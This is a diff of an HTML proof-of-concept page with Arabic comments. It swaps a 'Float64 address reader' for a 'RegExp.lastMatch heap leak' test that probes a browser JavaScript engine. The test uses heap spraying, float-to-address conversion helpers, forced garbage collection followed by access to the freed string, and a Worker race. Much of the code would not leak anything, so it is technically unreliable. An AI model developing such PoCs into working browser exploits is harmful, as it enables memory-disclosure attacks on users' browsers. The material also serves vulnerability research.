@@ -1,103 +1,76 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h2>PoC 2: Float64 Address Reader</h2>
-<button onclick="runFloatLeak()">اقرأ عناوين الذاكرة</button>
-<div id="output" style="font-family: monospace; white-space: pre; background: #000; color: #0f0; padding: 10px;"></div>
+<h2>PoC 3: RegExp.lastMatch Heap Leak</h2>
+<button onclick="runRegExpLeak()">ابدأ التسريب</button>
+<div id="result" style="font-family: monospace; white-space: pre;"></div>
 
 <script>
 function log(msg) {
-    document.getElementById('output').textContent += msg + '\n';
+    document.getElementById('result').textContent += msg + '\n';
 }
 
-// أدوات التحويل الأساسية
-const f64 = new Float64Array(1);
-const u64 = new BigUint64Array(f64.buffer);
-const u32 = new Uint32Array(f64.buffer);
-
-function addrToDouble(addr) {
-    u64[0] = BigInt(addr);
-    return f64[0];
-}
-
-function doubleToAddr(d) {
-    f64[0] = d;
-    return '0x' + u64[0].toString(16);
-}
-
-function runFloatLeak() {
-    log('=== Float64 Address Leak ===\n');
+function runRegExpLeak() {
+    log('=== RegExp.lastMatch Leak ===\n');
     
-    // إنشاء عدة objects في الذاكرة
-    const objects = [];
-    for (let i = 0; i < 10; i++) {
-        objects.push({
-            tag: 'OBJ_' + i,
-            data: new ArrayBuffer(1024),
-            marker: 0x4141414141414141n
-        });
-    }
+    // 1. إنشاء string ضخم يحتوي على marker
+    const marker = 'AAAA' + 'B'.repeat(1000) + 'CCCC';
     
-    // محاولة قراءة كل object كـ double
-    objects.forEach((obj, i) => {
-        log(`\n--- Object ${i} ---`);
-        
-        // جرب قراءة الـ object نفسه
-        try {
-            const asDouble = Number(obj);
-            if (!isNaN(asDouble) && asDouble !== 0) {
-                log(`Object as double: ${asDouble}`);
-                log(`Converted to addr: ${doubleToAddr(asDouble)}`);
-            }
-        } catch(e) {}
-        
-        // جرب خصائص الـ object
-        try {
-            // هذا قد يُسرب عنوان الـ ArrayBuffer
-            const view = new Uint8Array(obj.data);
-            const leaked = view.byteOffset;
-            log(`ArrayBuffer byteOffset: 0x${leaked.toString(16)}`);
-        } catch(e) {}
-        
-        // جرب BigInt property
-        try {
-            const markerDouble = Number(obj.marker);
-            log(`Marker as double: ${markerDouble}`);
-        } catch(e) {}
-    });
+    // 2. تشغيل regex يلتقط أجزاء
+    const re = /(.{100})/;
+    re.exec(marker);
     
-    log('\n=== Heap Spray & Read ===\n');
+    log(`RegExp.$1: ${RegExp.$1}`);
+    log(`RegExp.lastMatch: ${RegExp.lastMatch}`);
+    log(`RegExp.leftContext length: ${RegExp.leftContext.length}`);
+    log(`RegExp.rightContext length: ${RegExp.rightContext.length}`);
     
-    // Heap spray بـ objects متشابهة
-    const spray = [];
-    for (let i = 0; i < 1000; i++) {
-        spray.push({
-            a: 1.1, b: 2.2, c: 3.3,
-            str: 'MARKER_' + i,
-            buf: new ArrayBuffer(64)
-        });
-    }
-    
-    // محاولة إيجاد pattern في الذاكرة
-    log(`Sprayed ${spray.length} objects`);
-    
-    // جرب الوصول لـ object عبر index خاطئ
+    // 3. محاولة التلاعب بـ lastIndex
+    re.lastIndex = 500000000; // قيمة غير منطقية
     try {
-        const fakeArray = new Array(100);
-        fakeArray[50] = spray[0];
-        
-        // قراءة كـ float64
-        const f64View = new Float64Array(fakeArray.buffer);
-        for (let i = 0; i < 20; i++) {
-            if (f64View[i] !== 0) {
-                log(`f64[${i}] = ${f64View[i]} → ${doubleToAddr(f64View[i])}`);
-            }
-        }
+        const result = re.exec('x'.repeat(100));
+        log(`After lastIndex manipulation: ${result}`);
     } catch(e) {
         log(`Error: ${e.message}`);
     }
     
-    log('\n=== انتهى PoC 2 ===');
+    // 4. اختبار مع string مُحرر
+    let bigStr = 'X'.repeat(1024 * 1024); // 1MB
+    const re2 = /(X{100})/g;
+    re2.exec(bigStr);
+    
+    // تحرير الـ string
+    bigStr = null;
+    if (typeof gc !== 'undefined') gc();
+    
+    // محاولة الوصول بعد التحرير
+    log(`\nAfter GC:`);
+    log(`RegExp.lastMatch: ${RegExp.lastMatch}`);
+    
+    // 5. استغلال race condition مع Worker
+    log('\n=== Worker Race Condition ===');
+    const workerCode = `
+        self.onmessage = function(e) {
+            const re = /(.+)/;
+            re.exec(e.data);
+            self.postMessage({
+                lastMatch: RegExp.lastMatch,
+                leftContext: RegExp.leftContext,
+                rightContext: RegExp.rightContext
+            });
+        };
+    `;
+    
+    const blob = new Blob([workerCode], {type: 'application/javascript'});
+    const worker = new Worker(URL.createObjectURL(blob));
+    
+    worker.onmessage = function(e) {
+        log('Worker result: ' + JSON.stringify(e.data));
+    };
+    
+    worker.postMessage('A'.repeat(10000));
+    
+    log('\n=== انتهى PoC 3 ===');
 }
 </script>
 </body>
